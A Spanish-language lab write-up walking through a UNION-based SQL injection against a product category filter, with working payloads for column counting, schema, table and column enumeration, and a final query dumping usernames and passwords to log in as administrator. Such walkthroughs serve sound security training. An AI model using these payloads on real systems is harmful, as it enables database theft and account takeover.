# 💉 Ataque UNION: extrayendo datos de otras tablas

## 📄 Descripción del laboratorio

Este laboratorio contiene una **vulnerabilidad de inyección SQL en el filtro de categoría de productos**.

La aplicación refleja los resultados de la consulta directamente en la respuesta HTML, lo que permite utilizar **UNION SELECT** para recuperar datos de otras tablas de la base de datos.

🎯 **Objetivo del laboratorio:**

* Extraer los valores de **username** y **password** de la tabla `users`
* Utilizar las credenciales del usuario **administrator** para iniciar sesión



## 📚 Teoría

En un ataque **UNION-based SQL Injection**, el atacante puede combinar la consulta original con otra consulta adicional usando `UNION`.

Ejemplo de consulta original:

```sql
SELECT col1, col2 FROM products WHERE category = 'Gifts'
```

Si el parámetro `category` es vulnerable, podemos inyectar:

```
UNION SELECT ...
```

Esto permite consultar **otras tablas de la base de datos**.

Para que el ataque funcione, deben cumplirse dos condiciones:

```
1. El número de columnas debe coincidir
2. Los tipos de datos deben ser compatibles
```

Si ambas condiciones se cumplen, la base de datos devolverá los resultados de ambas consultas en una sola respuesta.

En este laboratorio sabemos que existe una tabla:

```
users
```

con las columnas:

```
username
password
```

Si logramos devolver esos valores mediante `UNION SELECT`, aparecerán directamente en la página.



## 📝 Práctica

### 1️⃣ Determinar el número de columnas

Interceptamos la petición del filtro de categoría y la enviamos a **Burp Repeater**.

Probamos con `ORDER BY`:

```
/filter?category=' ORDER BY 1--
```

Funciona correctamente.

```
/filter?category=' ORDER BY 2--
```

Funciona correctamente.

```
/filter?category=' ORDER BY 3--
```

Devuelve un error.

Conclusión:

```
La consulta original devuelve 2 columnas
```

### 2️⃣ Comprobar qué columnas aceptan texto

Probamos un `UNION SELECT` con valores de prueba:

```
/filter?category=' UNION SELECT 'test1','test2'--
```

<img width="1078" height="1100" alt="image" src="https://github.com/user-attachments/assets/18e9727b-117d-461f-9783-702c01fbcb34" />
<br>

La respuesta muestra una fila adicional con `test1` y `test2`.

Esto confirma que **ambas columnas aceptan texto**.



### 3️⃣ Enumerar la estructura de la base de datos

Primero listamos los esquemas disponibles:

```
/filter?category=' UNION SELECT NULL,schema_name FROM information_schema.schemata--
```

<img width="1456" height="870" alt="image" src="https://github.com/user-attachments/assets/6eb231a6-4e94-4ceb-bba8-7b61c4843ee2" />
<br>

En la respuesta aparece `public`, que suele ser el esquema principal.

Ahora listamos las tablas del esquema `public`:

```
/filter?category=' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='public'--
```

<img width="1520" height="753" alt="image" src="https://github.com/user-attachments/assets/d5f01ffc-40b1-49cf-aa1a-1541b71132b1" />



### 4️⃣ Enumerar columnas de la tabla users

Consultamos las columnas de la tabla `users`:

```
/filter?category=' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'--
```

<img width="1520" height="781" alt="image" src="https://github.com/user-attachments/assets/063b530d-5ad5-401c-8314-227e030bebf2" />
<br>

La respuesta muestra:

```
username
password
```



### 5️⃣ Extraer usuarios y contraseñas

Construimos el payload final:

```
/filter?category=' UNION SELECT username,password FROM public.users--
```

<img width="1520" height="847" alt="image" src="https://github.com/user-attachments/assets/fd513a6f-ff88-4f03-9433-d88e832b3f74" />
<br>

La respuesta muestra los usuarios y contraseñas en texto claro, incluyendo las credenciales de `administrator`.



### 6️⃣ Resultado

Usamos las credenciales obtenidas para iniciar sesión como `administrator`.

✅ **Laboratorio resuelto.**
